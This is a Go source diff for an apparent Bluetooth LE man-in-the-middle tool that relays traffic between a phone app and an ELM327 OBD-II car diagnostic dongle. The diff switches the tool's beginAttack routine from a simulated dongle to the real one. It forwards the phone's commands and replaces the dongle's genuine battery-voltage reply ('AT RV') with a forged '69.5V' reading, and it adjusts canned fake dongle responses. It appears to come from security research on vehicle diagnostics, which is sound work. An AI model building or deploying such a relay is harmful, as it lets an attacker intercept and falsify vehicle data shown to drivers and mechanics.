@@ -22,6 +22,7 @@ var isPhoneConnected bool
 var isDongleConnected bool
 var publicDataFromPhone []byte
 var publicDataFromDongle []byte
+var ATcommand string
 var done = make(chan struct{})
 
 func startMsg() {
@@ -68,8 +69,16 @@ func NewCountTestService() *gatt.Service {
 				// infinite loop waiting on notification from dongle
 			}
 			fmt.Println("| Notification recieved back: " + string(publicDataFromDongle))
-			phone.Write(publicDataFromDongle)
+			var dataBack = publicDataFromDongle
 			publicDataFromDongle = []byte("")
+			switch {
+			case ATcommand == "RV":
+				// modify voltage from dongle
+				dataBack = []byte("69.5V\r>")
+			}
+			ATcommand = ""
+			//publicDataFromDongle = []byte("ELM327 v1.5\r>")
+			phone.Write(dataBack)
 			fmt.Println("Dongle -> RPI -> Phone")
 			return gatt.StatusSuccess
 
@@ -163,8 +172,14 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 				fmt.Println("| Ready to write commands towards dongle ... ")
 				isDongleConnected = true
 				for isPhoneConnected && len(publicDataFromPhone) != 0 {
-					p.WriteCharacteristic(c, []byte("ATZ\r\n"), false)
+					var stringData = string(publicDataFromPhone)
+					switch {
+					case strings.Contains(stringData, "AT RV"):
+						ATcommand = "RV"
+					}
+					p.WriteCharacteristic(c, publicDataFromPhone, false)
 					publicDataFromPhone = []byte("")
+					
 				}
 			}
 
@@ -205,6 +220,7 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 			if (c.Properties() & (gatt.CharNotify | gatt.CharIndicate)) != 0 {
 				f := func(c *gatt.Characteristic, b []byte, err error) {
 					// notify back to RPI -> Phone:
+
 					publicDataFromDongle = b
 					fmt.Printf("notified: % X | %q\n", b, b)
 				}
@@ -296,10 +312,11 @@ func beginAttack() {
 
 	// Dongle is connected
 	fmt.Println("| Trying to capture connection between Raspberry PI with VHM-ble")
-	//connectToDongle(gattDevice)
-	fakeDongle()
+	connectToDongle(gattDevice)
+	//fakeDongle()
 
 }
+
 
 func fakeOutput() {
 	for len(publicDataFromPhone) != 0 {
@@ -308,9 +325,9 @@ func fakeOutput() {
 		case strings.Contains(stringData, "ATZ"):
 			publicDataFromDongle = []byte("ELM327 v1.5\r>")
 		case strings.Contains(stringData, "ATD"):
-			publicDataFromDongle = []byte("OK\r\n>OK\r\n>")
+			publicDataFromDongle = []byte("OK\r\n>OK\r>")
 		case strings.Contains(stringData, "ATH1"):
-			publicDataFromDongle = []byte("OK\r\n>OK\r\n>")
+			publicDataFromDongle = []byte("OK\r\n>OK\r>")
 		case strings.Contains(stringData, "ATL0"):
 			publicDataFromDongle = []byte("OK\r>OK\r>")
 		case strings.Contains(stringData, "ATS0"):
@@ -318,7 +335,7 @@ func fakeOutput() {
 		case strings.Contains(stringData, "ATSP0"):
 			publicDataFromDongle = []byte("OK\r>OK\r>")
 		case strings.Contains(stringData, "0100"):
-			publicDataFromDongle = []byte("?\r>")
+			publicDataFromDongle = []byte("7E8064120A005B011\r>")
 		case strings.Contains(stringData, "0120"):
 			publicDataFromDongle = []byte("86F1114100BE3FB8118F\r\r>")
 		case strings.Contains(stringData, "0130"):
@@ -328,10 +345,11 @@ func fakeOutput() {
 		case strings.Contains(stringData, "ATMA"):
 			publicDataFromDongle = []byte("?\r>?\r>")
 		case strings.Contains(stringData, "AT RV"):
-			publicDataFromDongle = []byte("6969.69V\r>")
+			ATcommand = "RV"
+			publicDataFromDongle = []byte("12.3V\r>")
 		
 		default:
-			publicDataFromDongle = []byte("?\r>")
+			publicDataFromDongle = []byte("OK\r>")
 			fmt.Println("Unknown command: '" + stringData + "'")
 		}
 		publicDataFromPhone = []byte("")
